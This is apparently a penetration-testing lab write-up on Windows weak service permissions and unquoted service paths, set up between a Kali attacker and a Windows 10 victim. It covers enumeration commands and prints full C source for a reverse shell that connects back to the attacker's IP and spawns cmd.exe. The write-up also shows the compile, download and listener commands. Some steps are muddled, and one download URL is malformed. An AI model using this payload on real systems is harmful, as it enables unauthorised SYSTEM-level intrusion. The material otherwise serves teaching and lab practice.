<h1 align="center"> Windows Weak Service Permissions </h1>

<img width="1024" height="550" alt="Weak Service Permissions" src="https://github.com/user-attachments/assets/542ccf19-5623-42fe-96e7-a64560eede54" />


---


## Scope:
- **Attacker**: Kali Linux (IP `192.168.127.128`)
- **Victim**: windows 10 (IP `192.168.127.142`)

---


## Table of Contents







---


# INTRODUCTION TO WINDOWS WEAK SERVICE PERMISSIONS 


## What is Windows Weak Service Permissions?
**Windows weak service permissions**: refer to misconfigurations in the access control settings of Windows services that allow non-privileged users to modify or manipulate those services. This is a common privilege escalation vector in Windows environments, especially during penetration testing or red team engagements.


### How Windows Services Work
- **Service**: A background app managed by the Service Control Manager (SCM).
- **Runs as**: A specific account (e.g., LocalSystem, LocalService, NetworkService).
- **Protected by**: A permission list (DACL) that says who can start, stop, or change the service.



### What are Service Permissions?
````
Every Windows Service has a Security Descriptor (SD) that controls:
1. Who can START/STOP the service
2. Who can CHANGE its configuration  
3. Who can QUERY its status
4. Who can DELETE the service
````



## What makes permissions “weak”
If low‑privileged users (like “Users” or “Authenticated Users”) are allowed to change important parts of a service, that’s weak. The risky permissions are:
- **SERVICE_CHANGE_CONFIG**: Lets someone change the service’s executable path—dangerous because they can point it to their own program.
- **WRITE_DAC**: Lets someone change the service’s permissions—so they can grant themselves more power.
- **WRITE_OWNER**: Lets someone take ownership—then they can rewrite the permissions however they want.
- **GENERIC_WRITE / GENERIC_ALL**: Broad rights that include the dangerous ones above—effectively full control.


### Why are Weak Service Permissions Dangerous?
If a low-privilege user can modify a service that runs as SYSTEM, they can:
- Change the executable path
- Replace it with malicious code
- Restart the service
- Get SYSTEM privileges!


---



# SETUP LAB

## Create the vulnerable service
First press `Ctrl + S` -> type `cmd` -> choose `Run as Administrator`:
<img width="782" height="677" alt="image" src="https://github.com/user-attachments/assets/5e97b129-26e0-4b45-8128-3f6a279f1a56" />


### Create directories and a dummy binary
````
mkdir "C:\Program Files\Vuln Service"
copy C:\Windows\System32\notepad.exe "C:\Program Files\Vuln Service\service.exe"
````
<img width="1027" height="500" alt="image" src="https://github.com/user-attachments/assets/d8909eb2-43ce-47f6-9f9a-22019fb4edf9" />


### Create the service with an unquoted path
````
sc create VulnService binPath= "C:\Program Files\Vuln Service\service.exe" start= auto DisplayName= "Vulnerable Service"
sc description VulnService "Demo service with unquoted path"
````
- Check:
````
sc query VulnService
````
<img width="1306" height="325" alt="image" src="https://github.com/user-attachments/assets/946dd06e-2111-40fc-8ddb-bfdc8dd5b7a3" />

````
sc qc VulnService
````
<img width="693" height="290" alt="image" src="https://github.com/user-attachments/assets/6d9db129-04c7-47ae-a205-90a9a2d45a94" />


- Now we got successful.

---





# WEAK SERVICE PERMISSIONS METHODOLOGY



## ENUMERATED & EXPLOITATION


## 1. Enumeration 

### Using SC (Service Control)


#### List all services with their binary paths
````
sc query state= all | findstr SERVICE_NAME
````
<img width="717" height="818" alt="image" src="https://github.com/user-attachments/assets/b57ac63f-1ce3-4c80-98bd-fc4fdf2caa9f" />



````
sc qc "VulnService"
````
<img width="732" height="302" alt="image" src="https://github.com/user-attachments/assets/78b5d926-9aff-4d9a-aa5e-5006445be1f6" />

- `VulnServer`: is our Nmae Service that we was create on above.



#### Find unquoted paths
````
for /f "tokens=2 delims=:" %i in ('sc query state= all ^| findstr SERVICE_NAME') do @sc qc %i | findstr BINARY_PATH_NAME
````



#### Using WMIC
````
wmic service get name,pathname | findstr /i /v "C:\Windows" | findstr /i """"
````
<img width="1698" height="449" alt="image" src="https://github.com/user-attachments/assets/71c9ca6b-5047-426a-a027-689c978e074c" />


- `wmic service get name,pathname`: Lists all Windows services, showing:
  - `Name` → the internal service name.
  - `PathName` → the executable file the service runs.
- `| findstr /i /v "C:\Windows"`: Filters out any services whose executable path is inside C:\Windows.
This removes most built‑in system services, leaving mainly third‑party or vendor services.
- `| findstr /i """"`: Filters to only show entries that contain quotes (").
Most service paths are quoted, so this ensures you’re seeing valid executable paths.
- This command is used to list all non‑Windows services and their executable paths, so you can analyze which services might be risky or exploitable.

---



## Exploitation

### 2. Create Malicious Executable
- On attacker:
````
mousepad unquote_exploit.c
````
````
// unquote_exploit.c
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "ws2_32")

int main() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in addr;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }

    // Create socket
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET) {
        return 1;
    }

    // Configure target address
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("192.168.127.128");  // CHANGE THIS TO YOUR KALI IP!
    addr.sin_port = htons(4444);

    // Connect back to attacker
    if (WSAConnect(sock, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) != 0) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Prepare process startup info
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

    // Spawn cmd.exe with redirected I/O
    if (!CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Wait for process to finish (optional)
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Cleanup
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(sock);
    WSACleanup();

    return 0;
}
````
<img width="792" height="741" alt="image" src="https://github.com/user-attachments/assets/2195eea2-d6c1-4660-b3fa-457ad855fe54" />


### Compile
````
x86_64-w64-mingw32-gcc unquote_exploit.c -o unquote_exploit.exe -lws2_32
````
<img width="798" height="163" alt="image" src="https://github.com/user-attachments/assets/2621e2ca-8094-4289-8919-087274ce1565" />



### Transfer to Victim

- On kali
````
python3 -m http.server 8000
````
<img width="677" height="120" alt="image" src="https://github.com/user-attachments/assets/550d6ce4-cbae-4fbc-93af-51cfdd5399c8" />


- On windows:
````
curl http://192.168.127.128:8000/unquote_exploit.exe -o unquote_exploit.exe
````
<img width="840" height="90" alt="image" src="https://github.com/user-attachments/assets/0a0e889d-0480-40b9-a810-72be3fc8201f" />

<img width="547" height="164" alt="image" src="https://github.com/user-attachments/assets/8282f9d4-11a2-47b8-9fc9-8f35b31950d2" />


- Check:
````
Get-WmiObject Win32_Service | Where-Object { $_.PathName -notlike 'C:\Windows*' -and $_.PathName -notmatch '^"' -and $_.PathName -like "* *" } | Select-Object Name, PathName, StartMode
````
<img width="1894" height="228" alt="image" src="https://github.com/user-attachments/assets/610469f6-0c33-417d-9bb9-8fb53d69b3fc" />

- Confirm the service runs as SYSTEM
````
(Get-WmiObject Win32_Service -Filter "Name='VulnService'").StartName
````
<img width="1036" height="123" alt="image" src="https://github.com/user-attachments/assets/9b57e477-bbaf-47a7-9460-cc122efec867" />




````
nc -lvnp 4444
````
<img width="404" height="160" alt="image" src="https://github.com/user-attachments/assets/92843823-8fd4-4fb8-b92d-e72c14f38699" />

````
sc.exe start VulnService
````
<img width="547" height="187" alt="image" src="https://github.com/user-attachments/assets/cb57b8a7-13cb-454a-889c-f0a54f1b6a2b" />

- But in this I failed, but in this some service maybe work.


### Fix it:

#### If not, rename our compiled payload:
````
mv unquote_exploit.exe Program.exe
ls -la Program.exe
````
<img width="433" height="64" alt="image" src="https://github.com/user-attachments/assets/6a43dde9-c404-4940-a4e1-5a1ff9bbcf38" />

- Check:
````
ls -la Program.exe
cat Program.exe
````
<img width="1915" height="821" alt="image" src="https://github.com/user-attachments/assets/47b9852d-dd8c-4e4e-b99a-7d6138b7fdfb" />



- After on attacker (kali)
````
sudo python3 -m http.server 80
````
<img width="832" height="164" alt="image" src="https://github.com/user-attachments/assets/205c9fe4-ba86-4c29-b389-fad0854a6121" />



#### Download payload
````
Invoke-WebRequest -Uri "http://192.168.127/Program.exe" -OutFile "C:\Program.exe"
dir C:\Program.exe
````
<img width="1237" height="278" alt="image" src="https://github.com/user-attachments/assets/87c54fe2-92df-4295-9667-fa37f3c1c732" />



- After back to attacker.

#### On attacker:
````
nc -lvnp 4444
````
<img width="314" height="137" alt="image" src="https://github.com/user-attachments/assets/4fed16ce-4e5f-45a0-909a-59b581c5227d" />

- After on target.

#### Start the service
````
sc.exe start VulnService
````
<img width="760" height="179" alt="image" src="https://github.com/user-attachments/assets/33c152ec-a1f4-468c-9145-8d36af1150c3" />

- Now we got success. After back to our **Attacker**:
<img width="804" height="290" alt="image" src="https://github.com/user-attachments/assets/5cf65764-7437-4058-8eaa-788336007ae5" />

- Now we got target `shell`. But on victimit will show this:
<img width="955" height="127" alt="image" src="https://github.com/user-attachments/assets/b4bf7df5-2478-4a90-8cf5-f6492f4c37bf" />

We got the `shell` because the service failed with error 1053. The reverse shell executed successfully before the service timeout — so the exploit worked despite (and partly because of) the error.


#### Also we can start service on attack and listen on attacker:

- In this on attacker I start Listen:
<img width="427" height="193" alt="image" src="https://github.com/user-attachments/assets/3ace13ea-b344-45d6-8f61-e8969330a1eb" />

- But on attacker `Terminal` that i got first shell -> I start the service and what happen:
<img width="503" height="133" alt="image" src="https://github.com/user-attachments/assets/eb8de8f9-86ad-4551-a5d5-b9d11e64a336" />

- `Boom` after go back to `Listener Terminal`:
<img width="858" height="287" alt="image" src="https://github.com/user-attachments/assets/37e3d0d2-ef94-4812-a995-75c998ccc9db" />

- **Boom** now we got shell like first Terminal.


----



<h2 align="center"> Completed - Weak Service Permissions </h2>


<h2 align="center"> 
  &copy; 2026 Nin Kanong (<a href="https://github.com/Nin-Kanong/pentest-writeups">@k4n0ng</a>). All rights reserved.
</h2>








